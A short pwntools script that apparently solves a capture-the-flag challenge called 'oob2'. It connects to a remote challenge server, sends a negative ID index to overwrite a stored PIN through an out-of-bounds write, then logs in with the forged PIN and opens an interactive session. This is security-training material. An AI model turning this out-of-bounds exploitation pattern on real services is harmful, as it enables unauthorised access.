#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./oob2"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 3112)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    c
    '''

    # gdb.attach(c, gdbcmd)
    context.log_level ='debug'


rbp = p64(0x12334)
#main = p64(0x04006f7)

def write_pin():
    c.sendlineafter('ID:', str((0x06010a0 - 0x06010c0) // 8))
    c.sendlineafter('Nickname:', p32(1234))
    c.sendlineafter('PIN: ', '1')
    #c.recvuntil('[')

write_pin()
c.sendlineafter('ID:', '0')
c.sendlineafter('Nickname:', p32(1234))
c.sendlineafter('PIN: ', '1234')





c.interactive()
c.close()
